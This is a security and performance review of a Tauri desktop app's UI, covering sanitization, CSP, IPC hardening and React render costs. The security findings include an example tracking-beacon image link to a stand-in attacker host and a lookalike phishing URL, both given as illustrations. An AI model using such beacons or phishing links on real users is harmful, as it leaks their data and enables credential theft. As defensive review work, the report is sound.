# Phase 2: Security & Performance Review

Target: `apps/palette-tauri` — UI-relevant security + frontend render performance.

---

## Security Findings

**Verdict: well-sandboxed.** The headline risk (XSS via rendered crawled/RAG content through streamdown/shiki) does **not** materialize as script execution: Streamdown runs `rehype-sanitize` (GitHub schema) by default (strips `<script>`, event handlers, `javascript:` URLs), and the app ships a restrictive CSP (`script-src 'self'`, `connect-src 'self' ipc:`, `img-src 'self' asset: data:`). The Tauri IPC bridge is hardened: `axon_bridge.rs` deserializes the renderer's `baseUrl`/`token` into `_base_url`/`_token` and **ignores them** (real values come from server-side on-disk settings), `validate_axon_route()` allowlists `/v1/`-prefixed routes and rejects `..`/`\`/`?`/`#`/`://`, and `capabilities/default.json` grants only `core:window`/`core:event`/`global-shortcut` — **no shell/fs/http/opener/dialog**. No `dangerouslySetInnerHTML`/`innerHTML`/`eval` anywhere. No secret logging. Secrets written atomically at `0o600` with a writable-key allowlist. **No Critical or High findings.**

### Medium
- **S-M1 — Untrusted external images rendered with no prefix allowlist** (CWE-1021/CWE-359, ~CVSS 4.3). All `<Streamdown>` sites (`OutputPanel.tsx:178`, `OperationResultView.tsx:151/202`, `AskConversation.tsx:32`) inherit `harden`'s permissive default `allowedImagePrefixes: ["*"]`, `allowDataImages: true`. Crawled `![x](https://attacker/track.png?leak=)` becomes a tracking beacon (IP/timing/viewed-this-result leak). **Currently contained only by CSP `img-src 'self' asset: data:`** — CSP is doing load-bearing work; a future loosening re-exposes it, and `data:` images are still permitted. **Fix:** define a shared hardened `rehypePlugins` set (re-include `sanitize` since overriding replaces the array) with `allowedImagePrefixes: []`, `allowDataImages: false`.
- **S-M2 — Crawled-content links clickable with no domain allowlist** (CWE-601, ~CVSS 4.3). `OperationResultViewShared.tsx:33,64` (`<a target="_blank" rel="noopener noreferrer">`) and `OutputPanel.tsx:136` (`window.open(outputUrl,...)`, URL regex-extracted at `:253`). Attacker-influenced result URL (`https://login-axon.tootie.tv.evil.example/`) presented inside trusted-looking native UI = phishing. Mitigated by `rel="noopener noreferrer"`, plaintext URL shown beside link, and no `opener` capability. **Fix:** set `allowedLinkPrefixes` to known origins / `defaultOrigin`; consider hostname-mismatch warning; decide whether links should route through `opener` plugin with an allowlist vs navigate the WebView.

### Low / Informational
- **S-L1 — Streamdown `harden` left fully permissive** (defense-in-depth gap). Root cause of S-M1/S-M2; fixed by the same shared `STREAMDOWN_REHYPE`. Only Low because `rehype-sanitize` + CSP are the real defenses.
- **S-L2 — `imagePreviewSrc` builds `file://` from payload-controlled paths** (`OperationResultViewShared.tsx:305-310`, consumed `OperationResultView.tsx:407-418`). Server response could supply `/etc/...`. **Mitigated:** CSP `img-src` excludes `file:`, so it just breaks the image. **Fix:** use Tauri `asset:`/`convertFileSrc`, validate against screenshots dir, drop the dead `file://` branch.
- **S-L3 — Atomic secret-file write umask window before chmod** (`persistence.rs:431-449`, CWE-279, already documented). **Fix:** `OpenOptions::mode(0o600)` to create with mode atomically. Not UI-facing.
- **S-I1 — Token input lacks `autoComplete="off"`/`spellCheck={false}`** (`SettingsPanel.tsx:347-363`). Low-risk in WebView; cheap hardening. Masking + reveal toggle are fine.

### Dependency note
`streamdown ^2.5.0`, `shiki 3.23.0` (pinned), `react ^19.2.6`, `@tauri-apps/api ^2.10.0` — all current as of mid-2026, nothing abandoned. Streamdown posture is a config choice (S-M1/S-L1), not a vulnerable version. Recommend routine `pnpm audit` in CI.

---

## Performance Findings

**Verdict: small, mostly well-built.** `useWindowChrome` already dedupes resize calls, action filtering is trivial (37 actions), the streaming reducer is correctly guarded, and shiki highlight results are cached. No Critical findings. Two real wins.

### High
- **P-H1 — shiki highlighter instantiated eagerly at module load, on the startup critical path.** `limitedStreamdownCode.ts:32-36` calls `createHighlighterCore({...})` at module-eval with 8 grammars + theme + regex engine; pulled into the **main chunk** via `streamdownConfig.ts` → `OutputPanel` → `App.tsx`. No `manualChunks` in `vite.config.ts`, no `React.lazy`/dynamic import anywhere. A fresh palette launch shows only the command bar + action list (no markdown/code) but pays the full shiki+streamdown JS-init before first interactive paint — the biggest hit to time-to-interactive. **Fix:** `React.lazy` the markdown body behind `<Suspense>`, make the highlighter lazy (`highlighterPromise ??= ...`), add `build.rollupOptions.output.manualChunks` for `shiki`/`streamdown`. **Largest perceived-perf payoff.**
- **P-H2 — Global keydown listener re-binds on every keystroke AND every stream delta.** `App.tsx:98-134` deps include `query` (changes per keystroke) and `run` (new object per stream delta → `useActionRunner.ts:64-66`). Pure waste on the two hottest paths; latent stale-closure risk. (= Phase 1 H3.) **Fix:** read live state through a ref, bind once with `[]` (mirror the already-correct `blur` listener at `:92-96`).

### Medium
- **P-M1 — No `React.memo` on result views; whole output subtree re-renders per stream token.** Zero `React.memo` in the components tree. During `ask`/`chat` streams each delta re-renders `App`→`OutputPanel`→`AskConversation`→`ConversationThread`. **Saving grace:** Streamdown's internal block-memoization + the `(lang,themes,length,head,tail)` highlight cache (`limitedStreamdownCode.ts:90-94`) mean shiki does NOT re-tokenize completed blocks — hence Medium not High. **But** `firstUrl(run.text)` regex over the whole growing buffer every token (`OutputPanel.tsx:72`) is O(n)/delta → **O(n²) over the stream** — likely source of any late-stream jank. Also `readingHeaderSummary` (`:203-229`) recomputes each token. **Fix:** `useMemo` per-buffer derived values, `React.memo` the result views, split the streaming markdown body into its own memoized component.
- **P-M2 — Unstable inline callbacks defeat memoization.** `App.tsx:327-495` creates fresh arrows for `onCopy`/`onRetry`/`onFollowUp`/`onHistory`/`onCollapse`/`onTogglePin` (445-476), `onReset`/`onToggleSettings` (344-359), `onSubmit` (398). **Must ship with P-M1** — `useCallback` them or P-M1's `React.memo` is a no-op.
- **P-M3 — `copied`/`pinnedTargets`/`shownTick` in `App` re-render whole tree.** `App.tsx:54-57`; `copied` flash (1200ms timeout) re-renders the entire palette for a transient checkmark. Low absolute cost. **Fix (optional):** push `copied` into `OutputPanel`/the copy button. Profile-gated.

### Already-good — do NOT over-optimize
- Action filtering (`App.tsx:152-161`) — `useMemo`'d over 37 actions, microseconds. Phase 1's "wasted filtering" concern is a non-issue.
- The ~10 view booleans (`App.tsx:166-178`) — trivially cheap; recomputing per render is correct. (Note: Phase 1 M1/A-M1 flag these for *readability/maintainability*, which still stands — just not for perf.)
- Streaming reducer (`useActionRunner.ts:62-67`) — correctly guarded, bounded growth, listener bound once. Good.
- `useWindowChrome` (`:118-126`) — dedupes via `lastSizeRef`, does NOT thrash during typing. Deliberate fix; **don't touch.**
- Crawl poll (`useCrawlJob.ts:80`) 1Hz — appropriate, keyed/torn-down correctly.
- Fonts — 4 var woff2 ~149KB, `font-display: swap`, self-hosted. Reasonable. Cheap win: preload Manrope in `index.html`; verify Noto Sans (36K) is actually referenced.
- `styles.css` 4,005 lines — **one-time parse, not a render-perf bottleneck.** Phase 1's perf framing overstated; the dead-rule cleanup (Phase 1 M5) is tidiness, not perf.

### Priority order
1. P-H1 (lazy shiki/streamdown + manualChunks) — cold-start interactivity.
2. P-H2 (ref-based keydown listener) — cheap, removes hot-path churn.
3. P-M1 + P-M2 together — smooth long `ask` streams.
4. P-M3 / font preload — optional.

---

## Critical Issues for Phase 3 Context

Testing (3A):
- No `React.memo`/`useCallback` regression guards — if P-M1/P-M2 are applied, add a render-count test for streaming.
- Streaming reducer correctness is well-tested (`useActionRunner.test.tsx`) — confirm coverage of the O(n²) `firstUrl` path / large-buffer streams.
- a11y has **no test coverage** — keyboard nav, focus management, ARIA roles on the command/list (jest-axe candidate). This is the biggest UI/UX testing gap to probe.
- Security: no test asserting the streamdown sanitization holds (a regression test rendering a `<script>`/`javascript:` payload and asserting it's stripped would lock in S-M1/S-L1).

Documentation (3B):
- The design-system split-brain (Phase 1 A-H2) needs a documented canonical layer — check whether any CLAUDE.md / README explains `ui/aurora` vs `styles.css`.
- The JS↔CSS coupling (`LIST_CAP` ↔ `.action-scroll` max-height) and window-size constants need documenting (they're well-commented inline — note that).
